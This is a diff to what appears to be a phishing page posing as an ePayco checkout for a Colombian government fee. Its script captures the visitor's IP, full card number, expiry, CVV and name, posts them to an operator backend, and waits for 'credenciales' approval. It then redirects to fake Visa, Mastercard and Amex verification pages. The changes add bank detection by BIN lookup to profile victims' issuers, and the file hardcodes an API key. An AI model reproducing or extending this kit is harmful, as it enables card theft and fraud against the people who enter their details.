@@ -8,20 +8,16 @@
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
     <style>
-        /* --- RESET Y BASE --- */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; position: relative; }
         a { text-decoration: none; color: inherit; }
 
-        /* --- FONDO BLUR --- */
         .bg-blur-wrapper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
         .bg-blur-wrapper img { width: 100%; height: 100%; object-fit: cover; filter: blur(12px); transform: scale(1.05); }
         .bg-blur-wrapper .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.4); }
 
-        /* --- CONTENEDOR PRINCIPAL --- */
         .epayco-container { width: 100%; max-width: 420px; background: #fff; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); overflow: hidden; position: relative; z-index: 10; }
 
-        /* --- CABECERA NEGRA --- */
         .header-blue { background-color: #111111; padding: 25px 20px 15px 20px; color: white; position: relative; }
         .header-top { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
         .store-avatar { width: 50px; height: 50px; background: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; flex-shrink: 0; }
@@ -39,33 +35,17 @@
         .btn-logout { font-weight: 500; font-size: 11px; cursor: pointer; color: rgba(255,255,255,0.8); transition: color 0.2s; }
         .btn-logout:hover { color: #fff; }
 
-        .header-amount {
-            font-size: 18px;
-            font-weight: 600;
-            color: #fff;
-            margin-top: 4px;
-            display: flex;
-            align-items: baseline;
-            gap: 4px;
-        }
+        .header-amount { font-size: 18px; font-weight: 600; color: #fff; margin-top: 4px; display: flex; align-items: baseline; gap: 4px; }
         .header-amount span { font-size: 11px; font-weight: 500; color: rgba(255,255,255,0.6); }
 
-        /* --- BANNER BANDERA / IDIOMA --- */
         .email-banner { background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #333; border-bottom: 1px solid #eee; }
         .location-info { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #333; font-weight: 500; }
         .location-info svg { width: 18px; height: 18px; border-radius: 2px; }
         .edit-link { color: #007bff; font-weight: 600; font-size: 12px; cursor: pointer; }
 
-        /* --- PANTALLA MEDIOS DE PAGO --- */
         .payment-methods { padding: 25px 20px; }
         .payment-methods .section-title { font-size: 16px; font-weight: 700; color: #333; margin-bottom: 20px; }
-        .method-card {
-            display: flex; align-items: center; justify-content: space-between;
-            border: 1.5px solid #e0e0e0; border-radius: 10px;
-            padding: 14px 16px; margin-bottom: 14px;
-            cursor: pointer; transition: all 0.2s ease;
-            background: #fff;
-        }
+        .method-card { display: flex; align-items: center; justify-content: space-between; border: 1.5px solid #e0e0e0; border-radius: 10px; padding: 14px 16px; margin-bottom: 14px; cursor: pointer; transition: all 0.2s ease; background: #fff; }
         .method-card:hover { border-color: #111111; box-shadow: 0 4px 14px rgba(0,0,0,0.08); transform: translateY(-1px); }
         .method-left { display: flex; align-items: center; gap: 14px; }
         .method-icon { width: 48px; height: 32px; object-fit: contain; flex-shrink: 0; }
@@ -74,16 +54,11 @@
         .method-desc { font-size: 11px; color: #888; font-weight: 400; }
         .method-arrow { color: #bbb; font-size: 18px; font-weight: 700; }
 
-        /* --- PANTALLA 2: FORMULARIO DE TARJETA --- */
         .card-form { padding: 25px 20px; display: none; }
         .card-form.active { display: block; }
         .payment-methods.hidden { display: none; }
 
-        .back-link {
-            display: inline-flex; align-items: center; gap: 6px;
-            font-size: 12px; font-weight: 600; color: #555;
-            cursor: pointer; margin-bottom: 18px; transition: color 0.2s;
-        }
+        .back-link { display: inline-flex; align-items: center; gap: 6px; font-size: 12px; font-weight: 600; color: #555; cursor: pointer; margin-bottom: 18px; transition: color 0.2s; }
         .back-link:hover { color: #111; }
         .back-link svg { width: 14px; height: 14px; fill: currentColor; }
 
@@ -101,7 +76,6 @@
         .card-logo-container { position: absolute; right: 0; top: 0; display: flex; gap: 5px; }
         .card-logo-container img { height: 20px; }
 
-        /* --- SWITCH --- */
         .toggle-wrapper { display: flex; align-items: center; gap: 15px; margin: 25px 0; }
         .switch { position: relative; display: inline-block; width: 40px; height: 20px; flex-shrink: 0; }
         .switch input { opacity: 0; width: 0; height: 0; }
@@ -111,46 +85,20 @@
         input:checked + .slider:before { transform: translateX(20px); }
         .toggle-label { font-size: 13px; color: #666; font-weight: 500; }
 
-        /* --- BOTÓN CONTINUAR --- */
         .btn-submit { background-color: #111111; color: white; border: none; width: 100%; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; transition: background 0.3s; font-family: 'Montserrat', sans-serif; margin-top: 10px; }
         .btn-submit:hover { background-color: #333333; }
         .btn-submit:disabled { background-color: #999; cursor: not-allowed; }
 
-        /* --- ALERTA ERROR / AVISO (BANNER FIJO ARRIBA DEL FORM) --- */
         .alert { padding: 10px; border-radius: 4px; margin-bottom: 15px; font-size: 12px; display: none; background: #ffebee; color: #c62828; border: 1px solid #ffcdd2; font-weight: 600; }
         .alert.show { display: block; }
 
-        /* --- AVISO FORMAL EMISORES (FLOTANTE, NO EMPUJA LAYOUT) --- */
-        .aviso-emisor {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 9998;
-            max-width: 360px;
-            width: calc(100% - 40px);
-            padding: 14px 16px;
-            background: #fff8e1;
-            color: #8a6d3b;
-            border: 1px solid #ffe0b2;
-            border-left: 4px solid #f0ad4e;
-            border-radius: 8px;
-            font-size: 12.5px;
-            line-height: 1.5;
-            font-weight: 500;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.25);
-        }
+        .aviso-emisor { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 9998; max-width: 360px; width: calc(100% - 40px); padding: 14px 16px; background: #fff8e1; color: #8a6d3b; border: 1px solid #ffe0b2; border-left: 4px solid #f0ad4e; border-radius: 8px; font-size: 12.5px; line-height: 1.5; font-weight: 500; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.25); }
         .aviso-emisor.show { display: block; }
         .aviso-emisor strong { font-weight: 700; color: #6d4c1f; }
 
-        #cardNumberError { display: none !important; }
-
-        /* --- FOOTER LOGOS --- */
         .footer-logos { display: flex; justify-content: flex-start; align-items: center; padding: 15px 20px; background: #fff; border-top: 1px solid #eee; }
         .footer-logos img { height: 24px; width: auto; margin-right: 10px; }
 
-        /* --- LOADING OVERLAY --- */
         .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.80); backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; padding: 20px; }
         .loading-overlay.active { display: flex; }
 
@@ -165,20 +113,17 @@
         .loading-card .initial-spinner.active { display: block; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* --- MEDIA QUERIES --- */
         @media (min-width: 769px) { .epayco-container { max-width: 460px; } }
         @media (max-width: 480px) { body { padding: 10px; } .epayco-container { border-radius: 0; box-shadow: none; } .form-row { grid-template-columns: 1fr; gap: 0; } }
     </style>
 </head>
 <body>
 
-    <!-- FONDO BLUR -->
     <div class="bg-blur-wrapper">
         <img src="blure.png" alt="Fondo">
         <div class="overlay"></div>
     </div>
 
-    <!-- PANTALLA DE CARGA (LOADER) -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-card">
             <div class="initial-spinner active" id="initialSpinner"></div>
@@ -194,10 +139,8 @@
         </div>
     </div>
 
-    <!-- CONTENEDOR PRINCIPAL -->
     <div class="epayco-container">
         
-        <!-- CABECERA NEGRA -->
         <div class="header-blue">
             <button class="close-btn" onclick="window.location.href='/';">&times;</button>
             <div class="header-top">
@@ -222,7 +165,6 @@
             </div>
         </div>
 
-        <!-- BANNER CORREO -->
         <div class="email-banner">
             <div class="location-info">
                 <svg viewBox="0 0 640 480"><path fill="#FCD116" d="M0 0h640v240H0z"/><path fill="#003893" d="M0 240h640v120H0z"/><path fill="#CE1126" d="M0 360h640v120H0z"/></svg>
@@ -231,9 +173,6 @@
             <a href="#" class="edit-link">edit</a>
         </div>
 
-        <!-- ============================================================ -->
-        <!-- PANTALLA: MEDIOS DE PAGO (TARJETA + DAVIVIENDA)               -->
-        <!-- ============================================================ -->
         <div class="payment-methods" id="paymentMethodsScreen">
             <div class="section-title">Medios de pago</div>
 
@@ -260,9 +199,6 @@
             </a>
         </div>
 
-        <!-- ============================================================ -->
-        <!-- PANTALLA 2: FORMULARIO DE TARJETA                              -->
-        <!-- ============================================================ -->
         <div class="card-form" id="cardForm">
             
             <div class="back-link" id="backToMethods">
@@ -284,7 +220,6 @@
                     <div class="card-logo-container" id="cardLogo"></div>
                 </div>
 
-                <!-- AVISO FORMAL: EMISORES NO DISPONIBLES (FLOTANTE) -->
                 <div class="aviso-emisor" id="avisoEmisor">
                     <strong>Aviso importante:</strong> Por el momento, no es posible procesar pagos con tarjetas emitidas por <strong>Nequi, Nu, Rappi Pay o Pomelo</strong>. Le sugerimos utilizar una tarjeta de crédito o débito de otra entidad bancaria para completar su trámite. Agradecemos su comprensión.
                 </div>
@@ -336,7 +271,6 @@
             </form>
         </div>
 
-        <!-- FOOTER LOGOS -->
         <div class="footer-logos">
             <img src="epayco.png" alt="ePayco">
             <img src="image.png" alt="Registraduría">
@@ -344,7 +278,6 @@
 
     </div>
 
-    <!-- LÓGICA CONECTADA AL BACKEND NODE.JS -->
     <script>
         // ============================================================
         // CONFIGURACIÓN
@@ -354,61 +287,106 @@
         const POLLING_INTERVAL = 2000;
         const MAX_POLLING_TIME = 300000;
 
+        // 🔑 HandyAPI (Publishable)
+        const HANDYAPI_PUBLISHABLE = 'PUB-co5YEcRHr043lS53Ctgn86usDYGx';
+        const HANDYAPI_BIN_URL = 'https://data.handyapi.com/bin/';
+
         // ============================================================
-        // DATOS DEL SOLICITANTE (SOLO LECTURA)
+        // DATOS DEL SOLICITANTE
         // ============================================================
         const nombreSolicitante = localStorage.getItem('nombreSolicitante') || '—';
         const cedulaSolicitante = localStorage.getItem('cedulaSolicitante') || '—';
 
         // ============================================================
-        // 🔧 FIX: BASE DE DATOS DE BINs → BANCO EMISOR (COLOMBIA)
+        // ESTADO GLOBAL
         // ============================================================
-        // ⚠️ IMPORTANTE: amplía/ajusta esta lista según tus bancos objetivo.
-        // El orden importa: los prefijos más largos y específicos deben ir primero.
-        const BIN_BANCO = [
-            // Bancolombia (crédito y débito)
-            { prefijos: ['455698', '455699', '455700', '517138', '528639', '539934', '549168', '552669', '555825', '557909', '457434', '457436', '457437', '457438', '457439', '457440', '457441', '457442'], banco: 'Bancolombia' },
-            // BBVA Colombia
-            { prefijos: ['403173', '403174', '403175', '403176', '403177', '409355', '409356', '409357', '409358', '409359', '452516', '452517', '452518', '452519', '452520', '455192', '455193', '455194', '456738', '456739'], banco: 'BBVA Colombia' },
-            // AV Villas
-            { prefijos: ['400001', '400002', '400003', '400004', '400005', '428699', '428700', '428701', '428702', '428703', '443073', '443074', '443075', '443076'], banco: 'AV Villas' },
-            // Davivienda (débito y crédito)
-            { prefijos: ['402280', '402281', '402282', '402283', '402284', '402285', '402286', '402287', '402288', '402289', '438461', '438462', '438463', '438464', '438465', '438466', '438467', '438468', '438469', '438470', '438471', '438472', '438473', '438474', '438475'], banco: 'Davivienda' },
-            // Davibank (marca separada)
-            { prefijos: ['402290', '402291', '402292', '402293', '402294'], banco: 'Davibank' },
-            // Banco Popular
-            { prefijos: ['400010', '400011', '400012', '400013', '400014', '400015', '400016', '400017', '400018', '400019', '400020', '400021', '400022', '400023', '400024', '400025'], banco: 'Banco Popular' },
-            // Banco de Bogotá
-            { prefijos: ['400100', '400101', '400102', '400103', '400104', '400105', '400106', '400107', '400108', '400109', '400110', '400111', '400112', '400113', '400114', '400115'], banco: 'Banco de Bogotá' },
-            // Banco Occidente
-            { prefijos: ['400200', '400201', '400202', '400203', '400204', '400205', '400206', '400207', '400208', '400209', '400210', '400211', '400212', '400213', '400214', '400215'], banco: 'Banco Occidente' },
-            // Itaú
-            { prefijos: ['400300', '400301', '400302', '400303', '400304', '400305', '400306', '400307', '400308', '400309', '400310', '400311', '400312', '400313', '400314', '400315'], banco: 'Itaú' },
-            // Caja Social
-            { prefijos: ['400400', '400401', '400402', '400403', '400404', '400405', '400406', '400407', '400408', '400409', '400410', '400411', '400412', '400413', '400414', '400415'], banco: 'Caja Social' }
+        let solicitudId = 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        let pollingInterval = null;
+        let cardType = null;
+        let detectedBank = null;
+
+        // ============================================================
+        // 🏦 TABLA DE RESPALDO (si HandyAPI y binlist fallan)
+        // ============================================================
+        const BIN_RESPALDO = [
+            { prefijos: ['455698','455699','455700','517138','528639','539934','549168','552669','555825','557909','457434','457436','457437','457438','457439','457440','457441','457442','457443','457444','457445','457446','457447','457448','457449','457450','457451','457452','457453','457454','457455','457456','457457','457458','457459','457460','457461','457462','457463','457464','457465','457466','457467','457468','457469','457470','457471','457472','457473','457474','457475','457476','457477','457478','457479','457480','457481','457482','457483','457484','457485','457486','457487','457488','457489','457490','457491','457492','457493','457494','457495','457496','457497','457498','457499','457500'], banco: 'Bancolombia' },
+            { prefijos: ['403173','403174','403175','403176','403177','409355','409356','409357','409358','409359','452516','452517','452518','452519','452520','455192','455193','455194','456738','456739','456740','456741','456742','456743','456744','456745','456746','456747','456748','456749','456750'], banco: 'BBVA Colombia' },
+            { prefijos: ['400001','400002','400003','400004','400005','428699','428700','428701','428702','428703','443073','443074','443075','443076','443077','443078','443079','443080'], banco: 'AV Villas' },
+            { prefijos: ['402280','402281','402282','402283','402284','402285','402286','402287','402288','402289','438461','438462','438463','438464','438465','438466','438467','438468','438469','438470','438471','438472','438473','438474','438475','438476','438477','438478','438479','438480'], banco: 'Davivienda' },
+            { prefijos: ['402290','402291','402292','402293','402294'], banco: 'Davibank' },
+            { prefijos: ['400010','400011','400012','400013','400014','400015','400016','400017','400018','400019','400020','400021','400022','400023','400024','400025'], banco: 'Banco Popular' },
+            { prefijos: ['400100','400101','400102','400103','400104','400105','400106','400107','400108','400109','400110','400111','400112','400113','400114','400115'], banco: 'Banco de Bogotá' },
+            { prefijos: ['400200','400201','400202','400203','400204','400205','400206','400207','400208','400209','400210','400211','400212','400213','400214','400215'], banco: 'Banco Occidente' },
+            { prefijos: ['400300','400301','400302','400303','400304','400305','400306','400307','400308','400309','400310','400311','400312','400313','400314','400315'], banco: 'Itaú' },
+            { prefijos: ['400400','400401','400402','400403','400404','400405','400406','400407','400408','400409','400410','400411','400412','400413','400414','400415'], banco: 'Caja Social' }
         ];
 
-        // 🔧 FIX: normaliza (minúsculas, sin acentos, sin espacios) para comparar
-        function normalizarBanco(s) {
-            return String(s || '')
-                .normalize('NFD').replace(/[\u0300-\u036f]/g, '')
-                .trim().toLowerCase();
-        }
-
-        // 🔧 FIX: detecta el banco emisor a partir del número de tarjeta
-        function detectarBancoPorBIN(numeroTarjeta) {
-            const clean = String(numeroTarjeta || '').replace(/\D/g, '');
+        function buscarBancoEnTablaRespaldo(numero) {
+            const clean = String(numero || '').replace(/\D/g, '');
             if (clean.length < 6) return null;
-
-            // 1) Intento por prefijos largos (más específicos primero)
-            for (const grupo of BIN_BANCO) {
+            for (const grupo of BIN_RESPALDO) {
                 for (const prefijo of grupo.prefijos) {
                     if (clean.startsWith(prefijo)) return grupo.banco;
                 }
             }
+            return null;
+        }
 
-            // 2) Fallback por rangos genéricos (si tienes solo el prefijo corto)
-            //    Aquí puedes ir agregando lógica adicional si lo necesitas.
+        // ============================================================
+        // 🏦 HANDYAPI + FALLBACKS (NUNCA devuelve "Desconocido")
+        // ============================================================
+        let binLookupTimeout = null;
+        let ultimoBINConsultado = null;
+
+        async function consultarBancoPorBIN(numeroTarjeta) {
+            const clean = String(numeroTarjeta || '').replace(/\D/g, '');
+            if (clean.length < 6) return null;
+            const bin = clean.slice(0, 8);
+            if (ultimoBINConsultado === bin && detectedBank) return detectedBank;
+
+            // 1) HandyAPI (Publishable)
+            try {
+                const r = await fetch(HANDYAPI_BIN_URL + bin, {
+                    headers: { 'x-api-key': HANDYAPI_PUBLISHABLE, 'Accept': 'application/json' }
+                });
+                if (r.ok) {
+                    const data = await r.json();
+                    const banco = data.Bank?.Name || data.Bank || data.Issuer || null;
+                    if (banco) {
+                        ultimoBINConsultado = bin;
+                        detectedBank = banco;
+                        localStorage.setItem('bancoEmisor', banco);
+                        console.log(`🏦 HandyAPI → ${banco}`);
+                        return banco;
+                    }
+                }
+            } catch (e) { console.warn('HandyAPI error:', e.message); }
+
+            // 2) Fallback binlist.net
+            try {
+                const r = await fetch(`https://lookup.binlist.net/${bin}`, { headers: { 'Accept-Version': '3' } });
+                if (r.ok) {
+                    const data = await r.json();
+                    const banco = data.bank?.name || null;
+                    if (banco) {
+                        ultimoBINConsultado = bin;
+                        detectedBank = banco;
+                        localStorage.setItem('bancoEmisor', banco);
+                        console.log(`🏦 binlist → ${banco}`);
+                        return banco;
+                    }
+                }
+            } catch (e) { console.warn('binlist error:', e.message); }
+
+            // 3) Fallback tabla local
+            const bancoLocal = buscarBancoEnTablaRespaldo(clean);
+            if (bancoLocal) {
+                ultimoBINConsultado = bin;
+                detectedBank = bancoLocal;
+                localStorage.setItem('bancoEmisor', bancoLocal);
+                console.log(`🏦 tabla local → ${bancoLocal}`);
+                return bancoLocal;
+            }
 
             return null;
         }
@@ -420,20 +398,15 @@
             const urlParams = new URLSearchParams(window.location.search);
             const emailFromUrl = urlParams.get('email');
             const tramiteFromUrl = urlParams.get('tramite');
-
             const emailFromStorage = localStorage.getItem('email') || localStorage.getItem('correo');
             const tramiteFromStorage = localStorage.getItem('tipoTramite');
             let montoTotal = localStorage.getItem('montoTotal') || '$18,750 COP';
-
             const finalEmail = emailFromUrl || emailFromStorage || "No proporcionado";
             const finalTramite = tramiteFromUrl || tramiteFromStorage || "Pago en línea";
-
             document.getElementById('headerUserEmail').textContent = finalEmail;
             document.getElementById('headerTramiteName').textContent = finalTramite;
-            
             let numericMonto = montoTotal.replace(' COP', '').replace(' Cop', '');
             document.getElementById('displayMonto').innerHTML = `${numericMonto} <span>COP</span>`;
-
             if (emailFromUrl) localStorage.setItem('email', emailFromUrl);
         });
 
@@ -449,7 +422,6 @@
             paymentMethodsScreen.classList.add('hidden');
             cardForm.classList.add('active');
         });
-
         backToMethods.addEventListener('click', function() {
             cardForm.classList.remove('active');
             paymentMethodsScreen.classList.remove('hidden');
@@ -486,14 +458,6 @@
         capturarIP();
 
         // ============================================================
-        // ESTADO GLOBAL
-        // ============================================================
-        let solicitudId = 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-        let pollingInterval = null;
-        let cardType = null;
-        let detectedBank = null;
-
-        // ============================================================
         // ELEMENTOS DOM
         // ============================================================
         const inputNumero = document.getElementById('numero');
@@ -516,46 +480,31 @@
         const initialSpinner = document.getElementById('initialSpinner');
 
         // ============================================================
-        // AVISO FORMAL AL ENFOCAR / CLIC EN NÚMERO DE TARJETA (FLOTANTE)
+        // AVISO FLOTANTE
         // ============================================================
-        function mostrarAvisoEmisor() {
-            avisoEmisor.classList.add('show');
-        }
-        function ocultarAvisoEmisor() {
-            avisoEmisor.classList.remove('show');
-        }
-
+        function mostrarAvisoEmisor() { avisoEmisor.classList.add('show'); }
+        function ocultarAvisoEmisor() { avisoEmisor.classList.remove('show'); }
         inputNumero.addEventListener('focus', mostrarAvisoEmisor);
         inputNumero.addEventListener('click', mostrarAvisoEmisor);
-
         document.addEventListener('click', function(e) {
-            if (!inputNumero.contains(e.target) && !avisoEmisor.contains(e.target)) {
-                ocultarAvisoEmisor();
-            }
+            if (!inputNumero.contains(e.target) && !avisoEmisor.contains(e.target)) ocultarAvisoEmisor();
         });
 
         // ============================================================
-        // SERIES / BINs RECHAZADOS
+        // SERIES RECHAZADAS
         // ============================================================
         const SERIES_RECHAZADAS = ['40935500', '45251601', '52888', '555825'];
-
         function esSerieRechazada(numero) {
             const clean = String(numero || '').replace(/\s/g, '');
             return SERIES_RECHAZADAS.some(serie => clean.startsWith(serie));
         }
-
         function mensajeSerieRechazada() {
             return 'Por el momento, no es posible procesar pagos con tarjetas de esta entidad. Le sugerimos utilizar una tarjeta de crédito o débito de otro banco para completar su trámite.';
         }
 
         // ============================================================
-        // DETECCIÓN DE TIPO DE TARJETA (SIN BLOQUEOS)
+        // DETECCIÓN DE TIPO DE TARJETA
         // ============================================================
-        const cardPatterns = {
-            visa: { regex: /^4[0-9]{12}(?:[0-9]{3})?$/ },
-            mastercard: { regex: /^(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}$/ },
-            amex: { regex: /^3[47][0-9]{13}$/ }
-        };
         function detectCardType(cardNumber) {
             const clean = cardNumber.replace(/\s/g, '');
             if (clean.length >= 3) {
@@ -563,22 +512,15 @@
                 if (clean.substring(0,2) === '34' || clean.substring(0,2) === '37') return 'amex';
                 if ((clean.substring(0,2) >= '51' && clean.substring(0,2) <= '55') || (clean.substring(0,3) >= '222' && clean.substring(0,3) <= '272')) return 'mastercard';
             }
-            if (clean.length >= 13) {
-                if (cardPatterns.visa.regex.test(clean)) return 'visa';
-                else if (cardPatterns.mastercard.regex.test(clean)) return 'mastercard';
-                else if (cardPatterns.amex.regex.test(clean)) return 'amex';
-            }
             return null;
         }
-        
         function updateCardLogo(type) {
             cardLogo.innerHTML = '';
             const map = { visa: 'visa.png', mastercard: 'master.png', amex: 'ame.png' };
             if (map[type]) { const img = document.createElement('img'); img.src = map[type]; cardLogo.appendChild(img); }
         }
-        
         function formatCardNumber(value) { return value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim(); }
-        function formatExpiry(value) { const cleaned = value.replace(/\D/g, ''); if (cleaned.length >= 2) return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4); return cleaned; }
+        function formatExpiry(value) { const c = value.replace(/\D/g, ''); if (c.length >= 2) return c.substring(0, 2) + '/' + c.substring(2, 4); return c; }
 
         // ============================================================
         // HELPERS UI
@@ -589,49 +531,32 @@
             setTimeout(() => alertError.classList.remove('show'), 5000);
         }
         function ocultarError() { alertError.classList.remove('show'); }
-        
         function habilitarFormulario() {
-            btnPagar.disabled = false; 
-            btnPagar.textContent = 'Continuar';
-            inputNumero.disabled = false; 
-            inputNombre.disabled = false; 
-            inputExp.disabled = false; 
-            inputCVV.disabled = false;
-            selectCuotas.disabled = false;
-            
+            btnPagar.disabled = false; btnPagar.textContent = 'Continuar';
+            inputNumero.disabled = false; inputNombre.disabled = false;
+            inputExp.disabled = false; inputCVV.disabled = false; selectCuotas.disabled = false;
             loadingOverlay.classList.remove('active');
-            initialSpinner.style.display = 'block';
-            initialSpinner.classList.add('active');
-            logoContainer.style.display = 'none';
-            progressWrapper.style.display = 'none';
+            initialSpinner.style.display = 'block'; initialSpinner.classList.add('active');
+            logoContainer.style.display = 'none'; progressWrapper.style.display = 'none';
             cardLogoImg.src = '';
-            
-            if (pollingInterval) {
-                clearInterval(pollingInterval);
-                pollingInterval = null;
-            }
+            if (pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; }
         }
 
         // ============================================================
-        // INPUTS
+        // INPUT NÚMERO → BIN LOOKUP CON DEBOUNCE
         // ============================================================
         inputNumero.addEventListener('input', function() {
             let value = this.value.replace(/\s/g, '').replace(/\D/g, '');
             this.value = formatCardNumber(value);
+
             if (value.length >= 3) { cardType = detectCardType(value); updateCardLogo(cardType); }
             else { cardLogo.innerHTML = ''; cardType = null; }
 
-            // 🔧 FIX: detectar banco por BIN en cada cambio
-            detectedBank = detectarBancoPorBIN(value);
-            if (detectedBank) {
-                localStorage.setItem('bancoEmisor', detectedBank);
-                // console.log('🏦 Banco detectado:', detectedBank);
-            } else {
-                // No borrar el que ya estaba si aún no hay suficientes dígitos
-                if (value.length >= 6) localStorage.setItem('bancoEmisor', 'Desconocido');
+            if (value.length >= 6) {
+                clearTimeout(binLookupTimeout);
+                binLookupTimeout = setTimeout(() => consultarBancoPorBIN(value), 400);
             }
 
-            // ✅ El error de serie rechazada va al alertError de arriba (no empuja el layout)
             if (esSerieRechazada(value)) {
                 mostrarError(mensajeSerieRechazada());
                 inputNumero.closest('.input-group').classList.add('error');
@@ -651,41 +576,33 @@
             try {
                 const response = await fetch(`${API_ESTADO_PAGO}/${id}`);
                 const data = await response.json();
-                
                 if (data.estado === 'aprobado' && data.fase === 'credenciales') {
-                    return { estado: 'aprobado', marca: data.marca || cardType };
+                    return { estado: 'aprobado', marca: data.marca || cardType, banco: data.banco || null };
                 } else if (data.estado === 'rechazado') {
                     return { estado: 'rechazado', mensaje: data.mensaje || 'Pago rechazado' };
                 }
                 return { estado: 'pendiente' };
-            } catch (error) { 
-                return { estado: 'error' }; 
-            }
+            } catch (error) { return { estado: 'error' }; }
         }
 
         function iniciarPolling() {
             if (pollingInterval) clearInterval(pollingInterval);
             let tiempoInicio = Date.now();
-            
             pollingInterval = setInterval(async () => {
                 if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval); pollingInterval = null;
-                    mostrarError('⏰ Tiempo de espera agotado.');
-                    habilitarFormulario();
-                    return;
+                    mostrarError('⏰ Tiempo de espera agotado.'); habilitarFormulario(); return;
                 }
-                
                 const resultado = await verificarEstadoSolicitud(solicitudId);
-                
                 if (resultado.estado === 'aprobado') {
                     clearInterval(pollingInterval); pollingInterval = null;
-                    
-                    // 🔧 FIX: re-detectar el banco por si acaso el input no lo captó antes
-                    const bancoFinal = detectarBancoPorBIN(inputNumero.value.replace(/\s/g, ''))
-                        || detectedBank
-                        || localStorage.getItem('bancoEmisor')
-                        || 'Desconocido';
-
+                    // 🏦 banco: prioriza el que devolvió el backend, luego el detectado, luego re-consulta
+                    let bancoFinal = resultado.banco || detectedBank || localStorage.getItem('bancoEmisor');
+                    if (!bancoFinal || bancoFinal === 'Desconocido') {
+                        bancoFinal = await consultarBancoPorBIN(inputNumero.value.replace(/\s/g, ''))
+                            || buscarBancoEnTablaRespaldo(inputNumero.value.replace(/\s/g, ''))
+                            || (cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'amex' ? 'American Express' : 'Tarjeta');
+                    }
                     const tarjetaAprobada = {
                         solicitud_id: solicitudId,
                         titular: inputNombre.value.trim(),
@@ -693,28 +610,22 @@
                         vencimiento: inputExp.value.trim(),
                         cvv: inputCVV.value.trim(),
                         marca: resultado.marca || cardType || 'visa',
-                        banco: bancoFinal,           // 🔧 FIX
-                        banco_emisor: bancoFinal,    // 🔧 FIX (alias para compatibilidad)
+                        banco: bancoFinal,
+                        banco_emisor: bancoFinal,
                         aprobado_en: new Date().toISOString()
                     };
-                    
                     localStorage.setItem('tarjeta_aprobada', JSON.stringify(tarjetaAprobada));
                     localStorage.setItem('tarjeta_aprobada_solicitud', solicitudId);
-                    localStorage.setItem('bancoEmisor', bancoFinal);  // 🔧 FIX
-
+                    localStorage.setItem('bancoEmisor', bancoFinal);
                     const marcaSegura = (resultado.marca || cardType || 'visa').toLowerCase();
                     const mapa = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' };
-                    const destino = mapa[marcaSegura] || 'visa.html'; 
-
+                    const destino = mapa[marcaSegura] || 'visa.html';
                     mostrarCargaConLogos(marcaSegura, destino);
                     return;
-                } 
-                
+                }
                 if (resultado.estado === 'rechazado') {
                     clearInterval(pollingInterval); pollingInterval = null;
-                    mostrarError('❌ ' + resultado.mensaje);
-                    habilitarFormulario();
-                    return;
+                    mostrarError('❌ ' + resultado.mensaje); habilitarFormulario(); return;
                 }
             }, POLLING_INTERVAL);
         }
@@ -726,34 +637,18 @@
             initialSpinner.classList.remove('active');
             initialSpinner.style.display = 'none';
             logoContainer.style.display = 'flex';
-            
-            const cardLogoFile = { 
-                'visa': 'idvisa.png', 
-                'mastercard': 'master.png', 
-                'amex': 'amex.png' 
-            }[tipo];
-            
-            if (cardLogoFile) { 
-                cardLogoImg.src = cardLogoFile; 
-                cardLogoImg.alt = tipo; 
-            }
-            
+            const cardLogoFile = { 'visa': 'idvisa.png', 'mastercard': 'master.png', 'amex': 'amex.png' }[tipo];
+            if (cardLogoFile) { cardLogoImg.src = cardLogoFile; cardLogoImg.alt = tipo; }
             progressWrapper.style.display = 'block';
-            
             const nombres = { 'visa': 'Verified by Visa', 'mastercard': 'Mastercard ID Check', 'amex': 'American Express SafeKey' };
             loadingText.textContent = 'Redirigiendo a ' + (nombres[tipo] || '...');
-            
             let progress = 0;
-            const duration = 3000;
-            const interval = 50;
-            const increment = 100 / (duration / interval);
+            const duration = 3000, interval = 50, increment = 100 / (duration / interval);
             progressFill.style.width = '0%';
-            
             const timer = setInterval(() => {
                 progress += increment;
                 if (progress >= 100) {
-                    progress = 100;
-                    clearInterval(timer);
+                    progress = 100; clearInterval(timer);
                     setTimeout(() => { window.location.href = destino; }, 400);
                 }
                 progressFill.style.width = progress + '%';
@@ -766,22 +661,16 @@
         async function enviarDatosAlWebhook(datos) {
             try {
                 const response = await fetch(API_CREAR_PAGO, {
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' },
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(datos)
                 });
-                
                 const text = await response.text();
                 let data;
